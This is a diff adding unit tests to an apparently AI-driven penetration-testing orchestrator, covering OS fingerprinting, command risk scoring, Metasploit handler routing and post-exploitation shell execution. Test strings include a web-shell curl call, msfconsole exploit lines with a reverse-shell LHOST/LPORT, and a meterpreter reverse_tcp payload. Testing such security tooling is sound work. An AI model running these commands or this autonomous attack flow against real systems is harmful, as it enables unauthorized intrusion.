@@ -14,7 +14,13 @@ import asyncio
 import contextlib
 from unittest.mock import AsyncMock, MagicMock
 
-from core.orchestrator import _detect_privilege_level, _detect_exhausted_target
+from core.orchestrator import (
+    _command_risk_level,
+    _detect_exhausted_target,
+    _detect_privilege_level,
+    _route_msf_to_managed_handler,
+)
+from core.scanner import classify_os
 from ai.connector import AIResponse
 from tests._helpers import make_orch, make_session, svc
 
@@ -364,6 +370,111 @@ def test_guess_default_payload_windows_vs_linux():
     assert "windows" in orch._guess_default_payload(win)
     assert "linux" in orch._guess_default_payload(lin)
 
+    x86 = make_session(services=[svc(21, "ftp", version="vsftpd")])
+    x86.discovered_hosts = [{
+        "ip": x86.target_ip,
+        "os_family": "linux",
+        "os_confidence": 0.9,
+        "architecture": "x86",
+        "ports": [],
+    }]
+    assert orch._guess_default_payload(x86) == "linux/x86/meterpreter/reverse_tcp"
+
+
+def test_os_classifier_does_not_call_samba_windows():
+    result = classify_os("", [
+        {"port": 22, "service": "ssh", "version": "OpenSSH 7.2"},
+        {"port": 80, "service": "http", "version": "Apache httpd"},
+        {"port": 445, "service": "microsoft-ds", "version": "Samba"},
+    ])
+    assert result["os_family"] == "linux"
+    assert result["os_confidence"] >= 0.7
+
+
+def test_os_classifier_prefers_explicit_windows_fingerprint():
+    result = classify_os("Microsoft Windows Server 2012 (96%)", [
+        {"port": 445, "service": "microsoft-ds", "version": "Microsoft Windows"},
+        {"port": 3389, "service": "ms-wbt-server", "version": "Microsoft Terminal Services"},
+    ])
+    assert result["os_family"] == "windows"
+    assert result["os_confidence"] >= 0.9
+
+
+def test_target_tool_risk_normalization_and_http_failure():
+    orch = _loop_orch()
+    assert _command_risk_level("curl -s http://10.0.0.5/shell.php?cmd=id", "high") == "medium"
+    assert _command_risk_level("msfconsole -q -x 'use exploit/x; run'", "high") == "medium"
+    assert _command_risk_level("sudo -l", "high") == "high"
+    assert orch._target_response_error(
+        "curl -s -w 'HTTP_CODE:%{http_code}' http://10.0.0.5/shell.php",
+        "HTTP_CODE:404",
+    ) == "target returned HTTP 404; requested endpoint/action was not successful"
+
+
+def test_msf_exploit_routes_to_persistent_handler():
+    s = make_session()
+    s.exploit_lhost = "192.168.100.198"
+    command = (
+        'msfconsole -q -x "use exploit/linux/http/example; '
+        'set LHOST 192.168.100.198; set LPORT 4444; exploit -z"'
+    )
+    routed = _route_msf_to_managed_handler(command, s)
+    assert "set DisablePayloadHandler true; exploit -z" in routed
+    assert _route_msf_to_managed_handler("msfconsole -q -x 'use multi/handler; run'", s) == (
+        "msfconsole -q -x 'use multi/handler; run'"
+    )
+
+
+def test_coverage_is_scoped_to_referenced_host_and_port():
+    orch = _loop_orch()
+    s = make_session(services=[
+        svc(445, "microsoft-ds", host="10.0.0.5"),
+        svc(445, "microsoft-ds", host="10.0.0.6"),
+    ])
+    orch.sessions[s.session_id] = s
+    orch._ensure_coverage(s)
+    orch._update_coverage_from_command(
+        s, "nmap -p445 --script smb-protocols 10.0.0.5",
+        success=True,
+    )
+    assert s.service_coverage["10.0.0.5:445"]["steps"]["smb.protocols"] == "done"
+    assert s.service_coverage["10.0.0.6:445"]["steps"]["smb.protocols"] == "pending"
+
+
+def test_cidr_os_summary_does_not_use_first_host():
+    orch = _loop_orch()
+    s = make_session(ip="10.0.0.0/24")
+    s.discovered_hosts = [
+        {"ip": "10.0.0.5", "os_family": "linux", "os_confidence": 0.9,
+         "architecture": "x64", "architecture_confidence": 0.9, "ports": []},
+        {"ip": "10.0.0.6", "os_family": "windows", "os_confidence": 0.9,
+         "architecture": "x64", "architecture_confidence": 0.9, "ports": []},
+    ]
+    orch._refresh_target_os(s)
+    assert s.target_os == "mixed"
+    assert set(s.host_states) == {"10.0.0.5", "10.0.0.6"}
+
+
+def test_ai_managed_shell_action_uses_shell_channel():
+    orch = _loop_orch()
+    s = make_session(authorization_confirmed=True)
+    orch.sessions[s.session_id] = s
+    orch.run_shell_command = AsyncMock(return_value="uid=33(www-data) gid=33")
+    response = AIResponse(
+        reasoning="enumerate the foothold",
+        suggested_command="id",
+        risk_level="medium",
+        confidence=0.9,
+        attack_phase="post_exploitation",
+        execution_channel="managed_shell",
+        handler_id="h1",
+        msf_id=1,
+    )
+    _run(orch._execute_ai_response(s.session_id, response))
+    orch.run_shell_command.assert_awaited_once_with(
+        s.session_id, "h1", 1, "id", trigger_analysis=True
+    )
+
 
 def test_ensure_handler_starts_once_and_records_config():
     orch = _loop_orch()
@@ -414,6 +525,8 @@ def test_persist_shell_session_logs_caught_shell_decision():
             "target_ip": "10.0.0.5", "status": "open", "opened_at": "t0"}
     orch._persist_shell_session(s.session_id, "h1", info)
     assert s.ai_decisions[-1]["context"] == "shell_caught"
+    assert len(s.compromise_evidence) == 1
+    assert s.compromise_evidence[0]["signal"] == "managed-session-opened"
 
 
 # ── episode summary (regressions) ───────────────────────────────────────────
